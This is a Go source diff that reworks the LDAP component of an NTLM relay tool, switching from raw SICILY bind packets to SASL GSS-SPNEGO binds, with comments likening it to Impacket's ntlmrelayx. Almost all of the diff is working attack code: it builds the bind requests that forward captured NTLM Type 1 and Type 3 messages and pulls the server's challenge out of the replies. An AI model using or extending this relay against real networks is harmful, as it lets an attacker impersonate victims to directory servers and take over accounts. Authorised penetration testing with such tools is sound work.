@@ -9,16 +9,14 @@ import (
 	ber "github.com/go-asn1-ber/asn1-ber"
 )
 
-// LDAP NTLM relay bind implementation using raw BER packets.
-// Implements the SICILY/NTLM authentication mechanism over LDAP:
-//   Step 1: BindRequest with Type 1 (Negotiate) → get Type 2 (Challenge)
-//   Step 2: BindRequest with Type 3 (Authenticate) → get success/failure
+// LDAP NTLM relay bind implementation using SASL/GSS-SPNEGO.
 //
-// MS-ADTS specifies NTLM over LDAP uses:
-//   - First bind: version=3, name="", auth=context[3](Type1)  [SICILY Negotiate]
-//   - Response: BindResponse with serverSaslCreds containing Type 2
-//   - Second bind: version=3, name="", auth=context[3](Type3) [SICILY Response]
-//   - Response: BindResponse with success (resultCode=0)
+// Uses standard SASL bind (RFC 4513 §5.2.1) with GSS-SPNEGO mechanism:
+//   Step 1: BindRequest SASL { "GSS-SPNEGO", SPNEGO(Type1) } → saslBindInProgress + SPNEGO(Type2)
+//   Step 2: BindRequest SASL { "GSS-SPNEGO", SPNEGO(Type3) } → success (resultCode=0)
+//
+// This is the same mechanism used by ldapsearch, Impacket ntlmrelayx, and
+// Windows LDAP clients for NTLM authentication over LDAP.
 
 const (
 	ldapAppBindRequest  = 0
@@ -26,7 +24,7 @@ const (
 )
 
 type ldapRelayConn struct {
-	conn net.Conn
+	conn  net.Conn
 	msgID int64
 }
 
@@ -44,61 +42,19 @@ func (lc *ldapRelayConn) close() {
 	lc.conn.Close()
 }
 
-// negotiate sends an LDAP BindRequest containing the NTLM Type 1 message
-// and returns the NTLM Type 2 challenge from the server's BindResponse.
+// negotiate sends an LDAP SASL BindRequest with GSS-SPNEGO wrapping the
+// NTLM Type 1 message and returns the NTLM Type 2 challenge.
 func (lc *ldapRelayConn) negotiate(ntlmType1 []byte) ([]byte, error) {
-	// Build: SEQUENCE { INTEGER(msgID), APPLICATION[0] { INTEGER(3), ""(name), CONTEXT[3](ntlmType1) } }
-	packet := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Message")
-	packet.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, lc.msgID, "MessageID"))
-	lc.msgID++
-
-	bindReq := ber.Encode(ber.ClassApplication, ber.TypeConstructed, ldapAppBindRequest, nil, "Bind Request")
-	bindReq.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 3, "Version"))
-	bindReq.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "", "Name"))
-
-	// SICILY: auth is context-specific [3] PRIMITIVE with the NTLM token
-	// TagEnumerated (10) in context class = SICILY Negotiate
-	auth := ber.Encode(ber.ClassContext, ber.TypePrimitive, ber.TagEnumerated, nil, "NTLM Negotiate")
-	auth.Value = ntlmType1
-	_, _ = auth.Data.Write(ntlmType1)
-	bindReq.AppendChild(auth)
-
-	packet.AppendChild(bindReq)
-
-	// Send
-	_, err := lc.conn.Write(packet.Bytes())
-	if err != nil {
-		return nil, fmt.Errorf("write negotiate: %w", err)
-	}
-
-	// Read response
-	respPacket, err := ber.ReadPacket(lc.conn)
-	if err != nil {
-		return nil, fmt.Errorf("read negotiate response: %w", err)
-	}
-
-	return lc.extractBindResponseCreds(respPacket)
+	spnegoToken := spnegoWrapNegTokenInit(ntlmType1)
+	return lc.saslBind("GSS-SPNEGO", spnegoToken)
 }
 
-// authenticate sends an LDAP BindRequest containing the NTLM Type 3 message
-// and returns nil on success or an error if authentication failed.
+// authenticate sends an LDAP SASL BindRequest with GSS-SPNEGO wrapping the
+// NTLM Type 3 message and returns nil on success.
 func (lc *ldapRelayConn) authenticate(ntlmType3 []byte) error {
-	packet := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Message")
-	packet.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, lc.msgID, "MessageID"))
-	lc.msgID++
+	spnegoToken := spnegoWrapNegTokenResp(ntlmType3)
 
-	bindReq := ber.Encode(ber.ClassApplication, ber.TypeConstructed, ldapAppBindRequest, nil, "Bind Request")
-	bindReq.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 3, "Version"))
-	bindReq.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "", "Name"))
-
-	// SICILY: auth is context-specific [3] PRIMITIVE with the NTLM Type 3
-	// TagEmbeddedPDV (11) in context class = SICILY Response
-	auth := ber.Encode(ber.ClassContext, ber.TypePrimitive, ber.TagEmbeddedPDV, nil, "NTLM Authenticate")
-	auth.Value = ntlmType3
-	_, _ = auth.Data.Write(ntlmType3)
-	bindReq.AppendChild(auth)
-
-	packet.AppendChild(bindReq)
+	packet := lc.buildSASLBindRequest("GSS-SPNEGO", spnegoToken)
 
 	_, err := lc.conn.Write(packet.Bytes())
 	if err != nil {
@@ -117,8 +73,50 @@ func (lc *ldapRelayConn) authenticate(ntlmType3 []byte) error {
 	return nil
 }
 
+// saslBind sends a SASL BindRequest and extracts the NTLM token from the response.
+func (lc *ldapRelayConn) saslBind(mechanism string, credentials []byte) ([]byte, error) {
+	packet := lc.buildSASLBindRequest(mechanism, credentials)
+
+	_, err := lc.conn.Write(packet.Bytes())
+	if err != nil {
+		return nil, fmt.Errorf("write SASL bind: %w", err)
+	}
+
+	respPacket, err := ber.ReadPacket(lc.conn)
+	if err != nil {
+		return nil, fmt.Errorf("read SASL bind response: %w", err)
+	}
+
+	return lc.extractBindResponseCreds(respPacket)
+}
+
+// buildSASLBindRequest constructs an LDAP BindRequest with SASL auth:
+//   SEQUENCE { msgID, APPLICATION[0] { version=3, name="", auth=[3] { mechanism, credentials } } }
+func (lc *ldapRelayConn) buildSASLBindRequest(mechanism string, credentials []byte) *ber.Packet {
+	packet := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Message")
+	packet.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, lc.msgID, "MessageID"))
+	lc.msgID++
+
+	bindReq := ber.Encode(ber.ClassApplication, ber.TypeConstructed, ldapAppBindRequest, nil, "Bind Request")
+	bindReq.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 3, "Version"))
+	bindReq.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "", "Name"))
+
+	// SASL auth: context [3] CONSTRUCTED { mechanism OCTET_STRING, credentials OCTET_STRING }
+	auth := ber.Encode(ber.ClassContext, ber.TypeConstructed, 3, nil, "SASL Auth")
+	auth.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, mechanism, "Mechanism"))
+
+	creds := ber.Encode(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, nil, "Credentials")
+	creds.Value = credentials
+	_, _ = creds.Data.Write(credentials)
+	auth.AppendChild(creds)
+
+	bindReq.AppendChild(auth)
+	packet.AppendChild(bindReq)
+
+	return packet
+}
+
 func (lc *ldapRelayConn) extractBindResponseCreds(packet *ber.Packet) ([]byte, error) {
-	// LDAP Message: SEQUENCE { INTEGER(msgID), APPLICATION[1](BindResponse) { ... } }
 	if len(packet.Children) < 2 {
 		return nil, fmt.Errorf("malformed LDAP response: expected 2+ children, got %d", len(packet.Children))
 	}
@@ -128,11 +126,9 @@ func (lc *ldapRelayConn) extractBindResponseCreds(packet *ber.Packet) ([]byte, e
 		return nil, fmt.Errorf("expected BindResponse (tag 1), got tag %d", bindResp.Tag)
 	}
 
-	// BindResponse: SEQUENCE { resultCode, matchedDN, diagnosticMessage, [7]serverSaslCreds? }
-	// The server SASL creds (NTLM Type 2) is in the last child with context tag 7
+	// BindResponse: { resultCode, matchedDN, diagnosticMessage, [7]serverSaslCreds? }
 	for _, child := range bindResp.Children {
 		if child.ClassType == ber.ClassContext && child.Tag == 7 {
-			// This is the serverSaslCreds — contains NTLM Type 2
 			creds := child.ByteValue
 			if len(creds) == 0 {
 				creds = child.Data.Bytes()
@@ -143,23 +139,19 @@ func (lc *ldapRelayConn) extractBindResponseCreds(packet *ber.Packet) ([]byte, e
 		}
 	}
 
-	// Check if result code indicates failure
 	resultCode, errMsg := lc.parseBindResult(packet)
 	if resultCode == 14 {
-		// saslBindInProgress — look for NTLM data in a different location
-		// Sometimes it's in the diagnosticMessage field
-		if len(bindResp.Children) >= 2 {
-			for _, child := range bindResp.Children {
-				data := child.ByteValue
-				if len(data) == 0 {
-					data = child.Data.Bytes()
-				}
-				if len(data) >= 8 && bytes.HasPrefix(data, sniffNTLMSig) {
-					return data, nil
-				}
+		// saslBindInProgress — scan all children for NTLM signature
+		for _, child := range bindResp.Children {
+			data := child.ByteValue
+			if len(data) == 0 {
+				data = child.Data.Bytes()
+			}
+			if len(data) >= 8 && bytes.HasPrefix(data, sniffNTLMSig) {
+				return data, nil
 			}
 		}
-		return nil, fmt.Errorf("saslBindInProgress but no NTLM challenge found")
+		return nil, fmt.Errorf("saslBindInProgress but no NTLM challenge found in %d children", len(bindResp.Children))
 	}
 
 	return nil, fmt.Errorf("no server SASL creds in bind response (resultCode=%d, msg=%s)", resultCode, errMsg)
